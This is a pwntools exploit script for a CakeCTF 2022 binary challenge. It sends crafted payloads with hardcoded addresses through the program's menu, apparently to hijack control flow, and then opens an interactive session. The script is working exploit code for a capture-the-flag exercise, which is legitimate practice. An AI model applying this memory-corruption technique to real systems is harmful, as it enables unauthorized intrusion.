from pwn import *

elf_file = FILENAME = 'chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = 'pwn1.2022.cakectf.com'
POST = 9003
'''
HOST = 'localhost'
POST = 7777
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    c = remote(HOST, POST)
else:
    c = process(FILENAME)

buf  = 0x4
payload = ''
payload += p64(0x4016de)


payload2 = '\x00'*0x20
payload2 += p64(0x404048)
payload2 += p64(0x8)
payload2 += p64(0x40)


print(cyclic_find('iaaajaaa'))
print(cyclic(32))

c.sendlineafter('choice: ','3')
c.sendlineafter('str:',payload)
c.sendlineafter('choice: ','1')
c.sendlineafter('str:',payload2)
c.sendlineafter('choice: ','3')
c.sendlineafter('str:',payload)
c.interactive()